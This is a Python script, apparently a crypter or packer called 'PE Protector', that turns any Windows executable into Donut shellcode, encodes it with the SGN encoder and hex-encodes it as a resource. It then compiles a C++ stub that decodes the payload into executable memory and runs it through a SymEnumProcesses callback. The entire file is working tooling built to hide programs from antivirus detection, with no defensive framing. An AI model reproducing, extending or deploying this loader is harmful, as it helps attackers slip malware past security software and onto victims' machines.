# Hex-Encoding Version

import subprocess
import os
import random
import sys
import argparse
import tempfile
import time
import threading
import binascii # Needed for hex encoding/decoding
from colorama import init, Fore, Style

init(autoreset=True)

# --- Configuration ---
UD = "./Utils/"
DDP = os.path.join(UD, "E2S.X")
DSP = os.path.join(UD, "SGN.X")
DCP = "cl.exe"
DRC = "rc.exe"

DA = "-b 1 -e 1 -z 3"
SAT = '-i "{ib}" -o "{ob}"'
CAT = '/nologo /O1 /GL /Gy /GS- /MT /EHsc /W3 /D "WIN32" /D "NDEBUG" /DEBUG:NONE /Fe:"{oe}" "{ic}" "{ir}" /link /LTCG /OPT:REF /OPT:ICF /INCREMENTAL:NO /SUBSYSTEM:WINDOWS kernel32.lib user32.lib Dbghelp.lib'
RCT = '/nologo /fo "{ores}" "{irc}"' # ores=output_res, irc=input_rc

# Resource constants
RES_ID = 101
RES_TYPE = "HEXDATA" # Custom type name, reflects content

# --- C++ Stub Template (Resource Loading & Hex Decoding) ---
CST = f"""
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <DbgHelp.h>
#include <string> // For hex decoding helper (or implement manually)
#include <vector> // For storing decoded bytes easily
#include <stdexcept> // For exceptions if needed

// Resource identifiers (must match .rc file)
#define RES_ID {RES_ID}
#define RES_TYPE L"{RES_TYPE}" // Wide string for FindResourceW

// Helper function to convert two hex chars to a byte
unsigned char hexCharsToByte(char c1, char c2) {{
    unsigned char byteVal = 0;
    // First hex digit
    if (c1 >= '0' && c1 <= '9') byteVal = (c1 - '0') << 4;
    else if (c1 >= 'a' && c1 <= 'f') byteVal = (c1 - 'a' + 10) << 4;
    else if (c1 >= 'A' && c1 <= 'F') byteVal = (c1 - 'A' + 10) << 4;
    else throw std::runtime_error("Invalid hex char"); // Or handle error differently

    // Second hex digit
    if (c2 >= '0' && c2 <= '9') byteVal |= (c2 - '0');
    else if (c2 >= 'a' && c2 <= 'f') byteVal |= (c2 - 'a' + 10);
    else if (c2 >= 'A' && c2 <= 'F') byteVal |= (c2 - 'A' + 10);
    else throw std::runtime_error("Invalid hex char"); // Or handle error differently

    return byteVal;
}}

int WINAPI WinMain(HINSTANCE hi, HINSTANCE hpi, LPSTR lp, int ncs) {{

    LPVOID mem = nullptr;
    HRSRC hr = NULL;
    HGLOBAL hg = NULL;
    LPVOID resPtr = NULL;
    DWORD resSize = 0; // Size of the hex string resource
    BOOL ok = FALSE;

    hr = FindResourceW(NULL, MAKEINTRESOURCEW(RES_ID), RES_TYPE);
    if (hr) {{
        resSize = SizeofResource(NULL, hr);
        hg = LoadResource(NULL, hr);
        if (hg) {{
            resPtr = LockResource(hg);
            // Ensure resource is valid and has an even number of hex chars
            if (resPtr && resSize > 0 && (resSize % 2 == 0)) {{

                SIZE_T decodedSize = resSize / 2; // Binary data will be half the size
                mem = VirtualAlloc(NULL, decodedSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                if (mem) {{
                    try {{
                        const char* hexStr = static_cast<const char*>(resPtr);
                        unsigned char* decodedBytes = static_cast<unsigned char*>(mem);

                        // --- HEX DECODING ---
                        for (DWORD i = 0; i < decodedSize; ++i) {{
                            decodedBytes[i] = hexCharsToByte(hexStr[i * 2], hexStr[i * 2 + 1]);
                        }}

                        // Initialize DbgHelp and execute
                        if (SymInitialize(GetCurrentProcess(), NULL, FALSE)) {{
                            SymEnumProcesses((PSYM_ENUMPROCESSES_CALLBACK)mem, NULL);
                            SymCleanup(GetCurrentProcess());
                            ok = TRUE;
                        }} else {{
                             VirtualFree(mem, 0, MEM_RELEASE);
                        }}
                    }} catch (const std::exception& e) {{
                        // Handle potential decoding errors (e.g., invalid hex chars)
                        OutputDebugStringA("Hex decoding failed!"); // Example error handling
                        if (mem) VirtualFree(mem, 0, MEM_RELEASE);
                        ok = FALSE;
                    }}
                }} // VirtualAlloc check
            }} // LockResource check
        }} // LoadResource check
    }} // FindResource check

    return ok ? 0 : 1;
}}
"""

# --- Console Output Helpers ---
def pi(m): print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {m}")
def ps(m): print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {m}")
def pw(m): print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {m}")
def pe(m): print(f"{Fore.RED}[-]{Style.RESET_ALL} {m}")

# --- Spinner ---
sse = threading.Event()
st = None
def sf():
    cs = ['|', '/', '-', '\\']
    i = 0
    while not sse.is_set():
        try:
            sys.stdout.write(f"\r{Fore.YELLOW}{Style.BRIGHT} {cs[i % len(cs)]}{Style.RESET_ALL} Processing...")
            sys.stdout.flush()
            i += 1; time.sleep(0.1)
        except OSError: break
    try: sys.stdout.write('\r' + ' ' * 30 + '\r'); sys.stdout.flush()
    except OSError: pass
def ss():
    global st, sse
    if st and st.is_alive(): return
    sse.clear(); st = threading.Thread(target=sf, daemon=True); st.start()
def stsp():
    global st
    if st and st.is_alive(): sse.set(); st.join(timeout=0.5)
    try: sys.stdout.write('\r' + ' ' * 30 + '\r'); sys.stdout.flush()
    except OSError: pass
    st = None

# --- Helper Functions ---
def rcmd(cmd, sh=True, sout=False, serr=False):
    sor = subprocess.DEVNULL if sout else None
    ser = subprocess.DEVNULL if serr else None
    try:
        r = subprocess.run(cmd, shell=sh, check=True, stdout=sor, stderr=ser,
                           text=True, encoding='utf-8', errors='ignore')
        return r
    except Exception as e: raise

def rtp(ta, dp, tn):
    if ta != dp and os.path.isfile(ta): return os.path.abspath(ta)
    if os.path.isfile(dp): return os.path.abspath(dp)
    if not os.path.isabs(ta):
        for pd in os.environ.get("PATH", "").split(os.pathsep):
            for ex in ["", ".exe"]:
                pp = os.path.join(pd, os.path.basename(ta) + ex)
                if os.path.isfile(pp): pi(f"Resolved {tn} via PATH: {pp}"); return pp
    pw(f"{tn} executable '{ta}' not found. Assuming shell access."); return ta

def cce():
    rv = ['INCLUDE', 'LIB', 'LIBPATH']; mv = [v for v in rv if not os.environ.get(v)]
    if mv: pw(f"Dev env vars missing: {', '.join(mv)}. Run from Dev Prompt."); return False
    pi("Developer environment check passed!"); return True

# --- Main Logic ---
def main():
    p = argparse.ArgumentParser(description="PE Protector v3: Donut->SGN->Hex->RC->Stub->Compile")
    p.add_argument("-i", "--input", required=True, help="Input executable (.exe).")
    p.add_argument("-o", "--output", required=True, help="Output protected executable (.exe).")
    p.add_argument("--donut", default=DDP, help=f"Donut path. Default: '{DDP}'")
    p.add_argument("--sgn", default=DSP, help=f"SGN path. Default: '{DSP}'")
    p.add_argument("--compiler", default=DCP, help=f"Compiler (cl.exe). Default: '{DCP}'")
    p.add_argument("--rc", default=DRC, help=f"Resource compiler (rc.exe). Default: '{DRC}'")
    p.add_argument("--keep-temp", action='store_true', help="Keep temporary files.")
    a = p.parse_args()

    pi("Starting TriProt v2...")
    cce()

    td = None; tdb = None; tsb = None; tpb = None; trc = None; trs = None; tcp = None
    stt = time.time()

    try:
        if not os.path.isfile(a.input): pe(f"Input file not found: {a.input}"); sys.exit(1)

        dpth = rtp(a.donut, DDP, "Donut"); spth = rtp(a.sgn, DSP, "SGN")
        cpth = a.compiler; rpth = rtp(a.rc, DRC, "RC")
        iea = os.path.abspath(a.input); oea = os.path.abspath(a.output)

        td = tempfile.mkdtemp()
        tdb = os.path.join(td, "d.bin"); tsb = os.path.join(td, "s.bin")
        tpb = os.path.join(td, "p.hex") # Changed extension to reflect content
        trc = os.path.join(td, "s.rc"); trs = os.path.join(td, "s.res")
        tcp = os.path.join(td, "s.cpp")
        pi(f"Using temp directory: {td}")

        # --- Step 1: Donut ---
        pi("Step 1: Running Donut..."); dcmd = f'"{dpth}" -i "{iea}" -o "{tdb}" {DA}'
        ss()
        try:
            rcmd(dcmd, sout=True, serr=True)
        finally:
            stsp()
        if not os.path.exists(tdb) or os.path.getsize(tdb) == 0: pe(f"Donut failed: {tdb}"); sys.exit(1)

        if not os.path.exists(tdb) or os.path.getsize(tdb) == 0: pe(f"Donut failed: {tdb}"); sys.exit(1)


        # --- Step 2: SGN ---
        pi("Step 2: Running SGN..."); scmd = f'"{spth}" {SAT.format(ib=tdb, ob=tsb)}'
        ss()
        try:
            rcmd(scmd, sout=True, serr=True)
        finally: stsp()
        if not os.path.exists(tsb) or os.path.getsize(tsb) == 0: pe(f"SGN failed: {tsb}"); sys.exit(1)


        # --- Step 3: Read SGN Output & Hex Encode ---
        pi("Step 3: Encoding SGN output as Hex string...")
        try:
            with open(tsb, "rb") as f: seb = f.read()

            if not seb: raise ValueError("SGN output empty.")

            # Convert bytes to hex string (lowercase)
            hex_string = binascii.hexlify(seb).decode('ascii')


            # Write the hex string AS TEXT to the payload file
            with open(tpb, "w", encoding='ascii') as f: f.write(hex_string)


        except (IOError, ValueError, binascii.Error) as e:
            pe(f"Error processing SGN output or writing hex data: {e}"); sys.exit(1)

        # --- Step 4: Generate RC file ---
        pi("Step 4: Generating resource script (.rc)...")
        # Reference the payload file containing the hex string
        rc_content = f'{RES_ID} {RES_TYPE} "{os.path.basename(tpb)}"'
        try:
            with open(trc, 'w', encoding='ascii') as f: f.write(rc_content)

        except IOError as e: pe(f"Cannot write RC file {trc}: {e}"); sys.exit(1)

        # --- Step 5: Compile RC file ---
        pi("Step 5: Compiling resource script (rc.exe)...")
        rc_args = RCT.format(ores=trs, irc=trc)
        rc_cmd = f'"{rpth}" {rc_args}'
        original_cwd = os.getcwd(); ss()
        try:
            os.chdir(td); rcmd(rc_cmd, sout=True, serr=True)
        except Exception as e:
            os.chdir(original_cwd); stsp(); pe(f"RC failed. CMD: {rc_cmd} | Error: {e}"); a.keep_temp=True; sys.exit(1)
        finally: os.chdir(original_cwd); stsp()
        if not os.path.exists(trs) or os.path.getsize(trs) == 0: pe(f"RC failed: {trs}"); a.keep_temp=True; sys.exit(1)


        # --- Step 6: Generate C++ Stub ---
        pi("Step 6: Generating stub...")
        cpp_src = CST # Uses the template with hex decoding logic

        # --- Step 7: Write C++ Stub ---

        try:
            with open(tcp, 'w', encoding='utf-8') as f: f.write(cpp_src)

        except IOError as e: pe(f"Cannot write C++ stub file {tcp}: {e}"); a.keep_temp=True; sys.exit(1)

        # --- Step 8: Compile C++ Stub with Resource ---
        pi("Step 7: Compiling stub...")
        compiler_args = CAT.format(oe=oea, ic=tcp, ir=trs)
        ccmd = f'"{cpth}" {compiler_args}'
        ss()
        try: rcmd(ccmd, sout=True, serr=True)
        except Exception as e:
            stsp(); pe(f"Compile failed."); pw("Attempting compile again to show errors...")
            try: rcmd(ccmd, sout=False, serr=False)
            except Exception as inner_e: pe(f"Compile error details: {inner_e}")
            pe(f"Compiler command was: {ccmd}"); a.keep_temp=True; sys.exit(1)
        finally: stsp()
        ps("Compilation complete.")

        # --- Success ---
        ett = time.time()
        ps("-" * 40); ps(f"Protected executable created successfully!"); ps(f"Output: {oea}")
        ps(f"Total time: {ett - stt:.2f} seconds"); ps("-" * 40)

    except SystemExit: pw("Operation aborted.")
    except Exception as e:
        stsp(); pe(f"An unexpected critical error occurred: {e}")
        import traceback; traceback.print_exc(); a.keep_temp=True
    finally:
        # --- Step 9: Cleanup ---
        if not a.keep_temp:
            pi("Cleaning up temporary files...")
            rc = 0; ftr = [tdb, tsb, tpb, trc, trs, tcp]
            for fp in ftr:
                if fp and os.path.exists(fp):
                    try:
                        os.remove(fp)
                        rc += 1
                    except OSError as e: pw(f"Failed to remove {fp}: {e}")
            if td and os.path.exists(td):
                try:
                     if not os.listdir(td): os.rmdir(td); pi("Removed temp directory.")
                     else: pw(f"Temp dir not empty, not removing: {td}")
                except OSError as e: pw(f"Failed to remove dir {td}: {e}")
            if rc > 0: pi(f"Removed {rc} file(s).")
        else:
             if td and os.path.exists(td): pi(f"Temporary files kept in: {td}")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: stsp(); pw("\nOperation interrupted by user."); sys.exit(1)